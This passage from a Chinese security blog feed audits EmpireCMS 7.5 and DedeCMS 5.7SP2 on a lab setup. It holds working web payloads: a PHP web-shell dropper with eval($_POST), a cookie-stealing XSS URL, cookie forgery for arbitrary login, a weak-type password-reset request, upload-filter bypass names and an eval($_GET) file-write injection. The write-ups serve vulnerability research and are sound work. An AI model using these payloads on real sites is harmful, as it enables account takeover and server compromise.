2021-03-17 212415">        </p><p>对此我们直接全局寻找<code>LoadInMod</code>的调用，在<code>e/admin/ecmsmod.php</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220115927.png" alt="image-20210317220115927"></p></li><li><p>漏洞复现</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20220503.png" alt="屏幕截图 2021-03-17 220503">    </p><p>新建一个<code>1.mod</code>的文件，内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"../data/getshell.php"</span>,<span class="string">"&lt;?php @eval(\$_POST[a]); ?&gt;"</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>上传成功后，即可得到shell</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210317220729395.png" alt="image-20210317220729395"></p></li></ul><h3 id="后台SQL执行getshell"><a href="#后台SQL执行getshell" class="headerlink" title="后台SQL执行getshell"></a>后台SQL执行getshell</h3><ul><li><p>漏洞分析</p><p>漏洞位于<code>e/admin/db/DoSql.php</code> 22行<code>DoExecSql</code>方法</p><p><code>$query</code>未经过任何处理就执行了</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20195309.png" alt="屏幕截图 2021-03-18 195309"></p><p><code>ClearAddsData</code>方法根据是否开启魔术引号来转义数据，这里我们不用管。跟进<code>RepSqlTbpre</code>方法，只做了前缀替换。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318200030207.png" alt="image-20210318200030207"></p><p>继续跟进<code>DoRunQuery</code>方法，替换<code>\r</code>,按<code>;</code>分割语句，然后就执行语句。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20200132.png" alt="屏幕截图 2021-03-18 200132"></p></li><li><p>漏洞利用</p><p>可以利用SQL语句写入shell，但利用难度很高。</p><p>首先需要开启mysql的<code>secure_file_priv</code> 默认是关闭的，修改my.conf文件, 在[mysqld] 下添加条目: <code>secure_file_priv =</code>,保存之后,然后重启mysql。</p><p>之后需要知道网站的绝对路径</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211927366.png" alt="image-20210318211927366"></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210318211959712.png" alt="image-20210318211959712"></p></li></ul><p>如果是站库分离影响实在有限。</p><h3 id="后台XSS"><a href="#后台XSS" class="headerlink" title="后台XSS"></a>后台XSS</h3><ul><li><p>漏洞分析</p><p>问题出在<code>e/admin/openpage/AdminPage.php</code>，获取<code>mainfile</code>，<code>leftfile</code>变量后，经过<code>hRepPostStr</code>处理后输出到页面</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319094155021.png" alt="image-20210319094155021"></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20182718.png" alt="屏幕截图 2021-03-19 182718"></p><p>跟进<code>hRepPostStr</code>方法</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20094520.png" alt="屏幕截图 2021-03-19 094520"></p><p>跟进<code>ehtmlspecialchars</code>,以<code>ENT_QUOTES</code>模式(既转换双引号也转换单引号)，转义HTML实体</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20181416.png" alt="屏幕截图 2021-03-19 181416"></p><p>跟进<code>CkPostStrChar</code>方法，结尾不能为 <code>\\</code>。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319181832873.png" alt="image-20210319181832873"></p><p>最后跟进<code>AddAddsData</code>方法，如果没有开启<code>magic_quotes_gpc</code>函数,就使用<code>addslashes</code>对参数中的特殊字符进行转义处理</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319182058498.png" alt="image-20210319182058498"></p></li><li><p>漏洞利用</p><p>访问<code>http://172.16.43.200:9093/e/admin/openpage/AdminPage.php?ehash_7NYw5=tJmMRJnmeKBHOPaBU04H&amp;mainfile=javascript:alert(document.cookie)</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319183728605.png" alt="image-20210319183728605"></p></li></ul><h3 id="后台任意代码执行"><a href="#后台任意代码执行" class="headerlink" title="后台任意代码执行"></a>后台任意代码执行</h3><ul><li><p>漏洞分析</p><p><code>e/admin/ebak/phome.php</code>接收备份数据库传递的参数,然后传递给<code>Ebak_DoEbak</code>方法中</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319201938388.png" alt="image-20210319201938388"></p><p>跟进<code>Ebak_DoEbak</code>，数据库表名传递给变量<code>$tablename</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20202302.png" alt="屏幕截图 2021-03-19 202302"></p><p>再经过<code>RepPostVar</code>处理，替换特殊字符，转义，防火墙过滤(默认上没有过滤字符)</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319203747991.png" alt="image-20210319203747991"></p><p>经过字符拼接赋值给<code>$d_table</code>，再拼接进<code>$string</code>最后写入php文件。</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204115.png" alt="屏幕截图 2021-03-19 204115"></p></li><li><p>漏洞利用</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204313.png" alt="屏幕截图 2021-03-19 204313"></p><p>抓包修改<code>tablename</code>字段</p><p><img src="/2021/03/EmpireCMSv7-5代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204718.png" alt="屏幕截图 2021-03-19 204718"></p><p>访问<code>config.php</code></p><p><img src="/2021/03/EmpireCMSv7-5代码审计/image-20210319204854229.png" alt="image-20210319204854229"></p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/LEOGG321/p/13882655.html" target="_blank" rel="noopener">https://www.cnblogs.com/LEOGG321/p/13882655.html</a></p>]]></content>
    
    <summary type="html">
    
      帝国CMSv7.5漏洞分析
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="CMS" scheme="https://0xcreed.jxustctf.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMSv5.7SP2代码审计</title>
    <link href="https://0xcreed.jxustctf.top/2021/03/DedeCMSv5-7SP2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://0xcreed.jxustctf.top/2021/03/DedeCMSv5-7SP2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2021-03-10T01:13:38.000Z</published>
    <updated>2021-03-20T03:27:02.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="审计环境"><a href="#审计环境" class="headerlink" title="审计环境"></a>审计环境</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>这里需要注意的是</p><p>dedecms在php5.4以上会因为session_register()等函数已移除，无法正常运行</p><p>在include/userlogin.class.php中代码替换,被替换代码大致在288到304行之间,代码如下:</p><p>代码如下:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserPurviewTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepAdminStyleTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure><a id="more"></a><p>替换为如下代码:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;keepUserIDTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;keepUserTypeTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;keepUserChannelTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;keepUserNameTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;keepUserPurviewTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$this</span>-&gt;keepAdminStyleTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure><p>364到368替换如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserPurviewTag);</span><br></pre></td></tr></table></figure><h3 id="cookie伪造导致任意前台用户登录"><a href="#cookie伪造导致任意前台用户登录" class="headerlink" title="cookie伪造导致任意前台用户登录"></a><strong>cookie伪造导致任意前台用户登录</strong></h3><ul><li><p>漏洞分析</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20103333.png" alt="屏幕截图 2021-03-13 103333"></p><p> 跟进<code>PutCookie</code>方法，在该方法中的第27行中将值与配置文件中的<code>$cfg_cookie_encode</code>进行拼接，然后进行MD5和截断处理<code>substr(md5($cfg_cookie_encode.$value),0,16)</code>，然后下发到客户端</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313104510453.png" alt="image-20210313104510453"></p><p> 而在<code>include/common.inc.php</code>使用的外部变量注册的方法进行变量声明，因此此处的$uid是用户可控的。</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20104107.png" alt="屏幕截图 2021-03-13 104107"></p><p> 这里我们就可以获取到任意用户的<code>last_vid</code> <code>last_vid__ckMd5</code></p><p> 而在文件<code>include/helpers/cookie.helper.php</code>中的第54-72行的GetCookie方法的代码块，其中第63行用于校验客户端cookie是否进行了伪造，因此要进行cookie就自然想到要获取<code>uploads/data/config.cache.inc.php</code>文件中的内容，需要存在任意文件读取或下载的漏洞，当然还有另外一种方式，就是控制<code>$uid</code>，利用PutCookie直接生成cookie，这样的cookie定会通过GetCookie方法。</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313105340716.png" alt="image-20210313105340716"></p></li></ul><p>   接着查看登录相关的代码，看它的cookie生成方法是否是PutCookie。在<code>include/memberlogin.class.php</code> 498行PutLoginInfo方法处理正确输入用户名和密码的情况</p><p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313112216221.png" alt="image-20210313112216221"></p><p>   继续跟进PutLoginInfo方法，果然用的是PutCookie方法，存在cookie伪造漏洞</p><p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20112733.png" alt="屏幕截图 2021-03-13 112733"></p><p>   在文件<code>include/memberlogin.class.php</code>的第160-242行发现代码块，其中第170行检测cookie中的DedeUserID参数的值，178行将这个值转换为整数，185行通过这个给值来查询用户。我们通过伪造DedeUserID即可任意用户登录了。</p><p>   <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20121536.png" alt="屏幕截图 2021-03-13 121536"></p><ul><li><p>漏洞复现</p><p> 情况一：</p><p> 由于mid在数据库中是int，所以要进行cookie的伪造需要注册用户名为要越权的用户mid数值，而admin默认为1。因此可以直接登录为admin。</p><p> 需要注册用户名为对应数据库中dede_member表中mid对应的值。如注册用户名为0001对应dede_member表中mid为1，便是admin的mid。</p><p> <img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20123051.png" alt="屏幕截图 2021-03-13 123051"></p></li></ul><p>然后访问<code>/member/index.php?uid=0001</code>获取伪造的cookie</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130027.png" alt="屏幕截图 2021-03-13 130027"></p><p>最后访问<code>/member/index.php</code>并带上cookie即可</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130235.png" alt="屏幕截图 2021-03-13 130235"></p><p>​    情况二：</p><p>​    在<code>member/index.php</code>文件第124行，当uid不为空时会<code>require_once(DEDEMEMBER.&#39;/inc/config_space.php&#39;)</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313131650792.png" alt="image-20210313131650792"></p><p>​    跟进<code>member/inc/config_space.php</code>在第29行调用了GetUserSpaceInfos方法</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313131855022.png" alt="image-20210313131855022"></p><p>​    跟进GetUserSpaceInfos方法，其SQL查询语句使用了<code>like</code>获取数据，通过构造特殊的用户名即可让其下发伪造cookie</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20131954.png" alt="屏幕截图 2021-03-13 131954"></p><p>这里我们假设要登录mid为5的用户</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132505860.png" alt="image-20210313132505860"></p><p>我们先注册类似于<code>xx5xx</code>的用户</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132632833.png" alt="image-20210313132632833"></p><p>然后访问<code>/member/index.php?uid=%5%</code>获取伪造cookie</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20132811.png" alt="屏幕截图 2021-03-13 132811"></p><p>加上cookie访问<code>/member/index.php</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313132944373.png" alt="image-20210313132944373"></p><h3 id="任意修改前台用户密码"><a href="#任意修改前台用户密码" class="headerlink" title="任意修改前台用户密码"></a><strong>任意修改前台用户密码</strong></h3><ul><li><p>漏洞分析</p><p>在<code>member/resetpassword.php</code>75-99行，进行安全问题的判断。默认<code>$row[&#39;safequestion&#39;]</code>在数据库的内容为<code>&#39;0&#39;</code>，<code>$row[&#39;safeanswer&#39;]</code>在数据库中的结果为<code>&#39;&#39;</code>，且变量<code>$safeanswer</code>与<code>$safequestion</code>是用户可控制的变量，又使用了 ==进行判断， 因此该判断规则存在弱类型问题。如果用户在注册时设置了密保问题则没有这个问题</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20151940.png" alt="屏幕截图 2021-03-13 151940"></p><p>这里打印下$row</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20153731.png" alt></p><p>对于<code>$safeanswer</code>我们不传值，经过85行处理也会为空，从而相等。</p><p>对于<code>$safequestion</code>我们需要传一个值使其绕过<code>empyt()</code>且等于<code>‘0’</code>。</p><p>根据手册，我们可以构造出 </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.0</span>(作为字符串)</span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0e0</span></span><br><span class="line"><span class="number">0e1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313155728546.png" alt="image-20210313155728546"></p></li></ul><ul><li><p>漏洞复现</p><p>先进行如下请求获取key</p><p><code>/member/resetpassword.php?dopost=safequestion&amp;safequestion=0x0&amp;safeanswer=&amp;id=2</code> </p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20160236.png" alt="屏幕截图 2021-03-13 160236"></p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313160537171.png" alt="image-20210313160537171"></p><h3 id="任意重置后台用户密码"><a href="#任意重置后台用户密码" class="headerlink" title="任意重置后台用户密码"></a><strong>任意重置后台用户密码</strong></h3><ul><li><p>漏洞分析</p><p>在<code>member/edit_baseinfo.php</code> 118-123行修改前端密码同时也会修改后端密码</p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313161155719.png" alt="image-20210313161155719"></p><h3 id="前台任意文件删除"><a href="#前台任意文件删除" class="headerlink" title="前台任意文件删除"></a><strong>前台任意文件删除</strong></h3><ul><li><p>漏洞分析</p><p>问题出在<code>member/inc/inc_batchup.php</code>的<code>DelArc</code>方法，对于<code>$licp[&#39;litpic&#39;]</code>直接拼接在目录后面只检测文件存不存在，没有检查文件类型就直接删除。重点在于这个<code>litpic</code>我们是否可控</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210313204533734.png" alt="image-20210313204533734"></p><p>接着全局搜索了<code>litpic</code>变量，发现<code>member/inc/archives_check_edit.php</code>发现79-93行可以通过控制<code>$oldlitpic</code>来<code>litpic</code>。在<code>$litpic</code>为空的情况下，<code>$litpic=$oldlitpic</code>。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314155059165.png" alt="image-20210314155059165"></p><p>接着全局搜索<code>archives_check_edit</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314152654346.png" alt="image-20210314152654346"></p><p>也就是这四个功能受影响</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20155544.png" alt="屏幕截图 2021-03-14 155544"></p><p>而在上传图集的功能里，同样可控<code>litpic</code> 在<code>member/album_add.php</code> 88-103行，在<code>$formhtml==1 &amp;&amp; $ddisfirst==1 &amp;&amp; $litpic==&#39;&#39; &amp;&amp; !empty($litpicname)</code>下<code>$litpic==$litpicname</code></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20160450.png" alt="屏幕截图 2021-03-14 160450"></p><p><code>$formhtml</code>可传参控制，<code>$ddisfirst</code>默认为1,至于<code>$litpic</code>我们跟进<code>archives_check.php</code>，在100-102行</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314161257476.png" alt="image-20210314161257476"></p><p>跟进<code>MemberUploads</code>方法，在<code>include/helpers/upload.helper.php</code> 118-240行，其中215-222行是关键在不上传缩略图的情况下会进入else分支，同时<code>MemberUploads</code>的<code>handname</code>参数默认为空。即返回值也为空。所以<code>$litpic</code>可控</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314161619071.png" alt="image-20210314161619071"></p><p>最后全局搜索<code>DelArc</code>函数查找触发点，在<code>member/archives_do.php</code>，有个<code>issystem</code>的判断</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314162605298.png" alt="image-20210314162605298"></p><p>数据库查询一下，默认情况下出了<code>infos</code>其他都会调用<code>DelArc</code>删除文件。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314162729095.png" alt="image-20210314162729095"></p></li><li><p>漏洞复现</p><p>情况一：</p><p>以文章为例 </p><p>先发表文章，内容随意填</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314164413817.png" alt="image-20210314164413817"></p><p>再修改文章同时加上<code>oldlitpic</code>的值</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20164614.png" alt="屏幕截图 2021-03-14 164614"></p><p>数据库：</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314164927927.png" alt="image-20210314164927927"></p><p>最后删除文章即可删除<code>oldlitpic</code>指向的文件。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-14%20165328.png" alt="屏幕截图 2021-03-14 165328"></p><p>情况二：</p><p>上传图集时添加<code>formhtml</code>和<code>litpicname</code>即可</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314165944131.png" alt="image-20210314165944131"></p><p>删除图集</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210314170320939.png" alt="image-20210314170320939"></p></li></ul><h3 id="前台任意文件上传"><a href="#前台任意文件上传" class="headerlink" title="前台任意文件上传"></a><strong>前台任意文件上传</strong></h3><ul><li><p>漏洞分析</p><p>上传需要admin权限，有点鸡肋。但配合之前的cookie伪造也还行。</p><p>问题在<code>include/dialog/select_images_post.php</code>对于后缀的处理逻辑有问题。在36行获取文件名,然后过滤。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210316211925145.png" alt="image-20210316211925145"></p><p>这个文件名就是我们上传的文件名，具体的调用是</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select_images_post</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">config</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">common</span><span class="selector-class">.inc</span><span class="selector-class">.php</span> <span class="selector-tag">-</span>&gt;  <span class="selector-tag">uploadsafe</span><span class="selector-class">.inc</span><span class="selector-class">.php</span></span><br></pre></td></tr></table></figure><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212521.png" alt="屏幕截图 2021-03-16 212521"></p><p>接着在58到64行进行后缀拼接和上传。直接通过<code>.</code>来分割文件名，将最后一个后缀作为文件后缀。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20212843.png" alt="屏幕截图 2021-03-16 212843"></p><p>通过构造类似</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p<span class="comment">%hp</span></span><br><span class="line">p*hp</span><br><span class="line">p&lt;hp</span><br><span class="line">p?hp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>即可绕过上传。</p></li><li><p>漏洞利用</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20213715.png" alt="屏幕截图 2021-03-16 213715"></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-16%20215140.png" alt="屏幕截图 2021-03-16 215140"></p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210316215503126.png" alt="image-20210316215503126"></p><h3 id="后台文件写入"><a href="#后台文件写入" class="headerlink" title="后台文件写入"></a>后台文件写入</h3><ul><li><p>漏洞分析</p><p>又是需要后台admin权限，太鸡肋了。DedeCMS后台本来就带有文件管理器，本着学习的态度就记录一下。</p><p>问题出在<code>dede/sys_verifies.php</code>，<code>fwrite</code>的参数未经过过滤，导致文件写入，配合<code>require_once</code>getshell</p></li></ul><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20190619.png" alt="屏幕截图 2021-03-17 190619"></p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20191424.png" alt="屏幕截图 2021-03-17 191424"></p><ul><li><p>漏洞复现</p><p>访问<code>/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\&quot;;eval($_GET[a]);die();//</code> 写入文件</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191752815.png" alt="image-20210317191752815"></p><p>访问<code>/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code>执行命令</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317191855712.png" alt="image-20210317191855712"></p></li></ul><h3 id="后台二次注入getshell"><a href="#后台二次注入getshell" class="headerlink" title="后台二次注入getshell"></a>后台二次注入getshell</h3><ul><li><p>漏洞分析</p><p>在<code>dede/ad_add.php</code>80-83行，参数<code>$normbody</code>未经过滤就放入数据库中</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20193957.png" alt="屏幕截图 2021-03-17 193957"></p><p>而在<code>plus/ad_js.php</code> 21-44行，查询结果直接包含。</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20194249.png" alt="屏幕截图 2021-03-17 194249"></p></li><li><p>复现漏洞</p><p><img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194532192.png" alt="image-20210317194532192"></p></li></ul><p>  <img src="/2021/03/DedeCMSv5-7SP2代码审计/image-20210317194553335.png" alt="image-20210317194553335"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/column/161703.html" target="_blank" 